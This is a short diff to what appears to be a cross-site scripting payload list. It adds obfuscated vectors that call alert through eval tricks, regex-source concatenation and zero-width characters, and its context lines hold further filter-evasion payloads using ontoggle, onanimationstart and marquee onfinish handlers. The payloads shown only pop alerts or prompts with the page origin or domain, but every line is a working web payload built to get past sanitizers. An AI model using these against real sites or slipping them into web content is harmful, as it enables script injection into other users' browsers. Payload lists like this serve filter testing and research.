@@ -1,3 +1,6 @@
+/* <​/script> &#x3c;img/src/ <​script>window[/al/.source+/ert/.source](origin);<​/script> /> */
+a=eval,c=["a"],x=["lert"],t=\${c}${x}(origin)`,a.call`1${t}``
+
 <details open id="' &quote;'"ontoggle=[JS]>
 <style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
 <marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
